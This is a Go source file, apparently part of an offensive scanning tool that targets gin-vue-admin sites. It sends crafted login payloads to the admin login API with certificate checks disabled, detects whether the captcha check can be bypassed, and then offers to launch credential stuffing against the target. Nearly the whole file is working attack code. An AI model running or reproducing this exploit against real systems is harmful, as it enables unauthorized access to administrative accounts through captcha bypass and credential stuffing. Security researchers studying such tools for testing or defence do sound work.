package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

type Response struct {
	Code int                    `json:"code"`
	Data map[string]interface{} `json:"data"`
	Msg  string                 `json:"msg"`
}

func getUserInput() string {
	reader := bufio.NewReader(os.Stdin)
	for {
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if input != "" {
			return input
		}
		fmt.Println("输入不能为空，请重新输入:")
	}
}

func createRequest(url string, payload []byte) (*http.Request, error) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	return req, nil
}

func doRequest(req *http.Request) (*Response, error) {
	// 创建一个新的 HTTP 客户端，禁用 SSL 证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// 如果 HTTP 响应的状态码为 404，返回一个特定的错误
	if resp.StatusCode == 404 {
		return nil, fmt.Errorf("HTTP 404 错误")
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var response Response
	err = json.Unmarshal(body, &response)
	if err != nil {
		// 如果解析 JSON 失败，返回一个更具体的错误信息
		return nil, fmt.Errorf("解析 JSON 失败，原始响应: %s, 错误: %v", string(body), err)
	}

	return &response, nil
}

func frontEndBypass(Info *HostInfo) {
	url := Info.Url + "/api/base/login"
	payloads := [][]byte{
		[]byte(`{"username": "ggb123","password":"ggb123 ","captcha":"1 ","captchaId":"1"}`),
		[]byte(`{"username": "ggb123","password":"ggb123 ","captchaId":"1"}`),
	}

	for poc, payload := range payloads {
		req, err := createRequest(url, payload)
		if err != nil {
			log.Println("创建请求失败:", err)
			continue
		}

		response, err := doRequest(req)
		if err != nil {
			// 如果捕获到 HTTP 404 错误，更改 URL 并重新创建请求
			if err.Error() == "HTTP 404 错误" {
				url = Info.Url + "/base/login"
				req, err = createRequest(url, payload)
				if err != nil {
					log.Println("创建请求失败:", err)
					continue
				}
				response, err = doRequest(req)
				if err != nil {
					log.Println("请求发送失败:", err)
					continue
				}
			} else {
				log.Println("请求发送失败:", err)
				continue
			}
		}
		if response.Msg == "用户名不存在或者密码错误" {
			if poc == 0 {
				log.Println("[+] gin-vue-admin前端验证码不校验,可绕过,是否进行撞库?(Y/N): ")
				userInput := strings.ToLower(getUserInput())
				if userInput == "y" {
					credentialStuffing1(Info)
				} else if userInput == "n" {
					break
				}
			} else if poc == 1 {
				log.Println("[+] gin-vue-admin前端验证码不校验captcha字段，可绕过,是否进行撞库?(Y/N): ")
				userInput := strings.ToLower(getUserInput())
				if userInput == "y" {
					credentialStuffing2(Info)
				} else if userInput == "n" {
					break
				}
			}
			break
		} else {
			log.Println("[-] gin-vue-admin前端验证码不可绕过")
		}

	}
}
